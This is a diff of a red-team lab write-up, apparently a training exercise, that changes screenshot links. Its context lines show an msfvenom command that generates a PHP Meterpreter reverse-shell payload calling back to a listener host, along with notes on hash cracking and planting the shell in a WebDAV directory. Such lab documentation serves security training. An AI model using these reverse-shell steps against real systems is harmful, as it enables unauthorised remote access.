@@ -83,7 +83,7 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 - To set up the reverse shell, run:
 	- msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/13_implanting_the_reverse.jpg)
 
 - The series of command above does the following :
 
@@ -99,7 +99,7 @@ paste the password hash and filled out the CAPTCHA; and clicked Crack Hashes.
 
 	- exploit  
 
-![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/10_connect_to_webdav.jpg)
+![alt text](https://github.com/jsanchez-cyberpro/Blue-vs-Red/blob/main/Red%20Team/12_listener.jpg)
 
 - Placed the reverse shell onto the webDAV directory
 
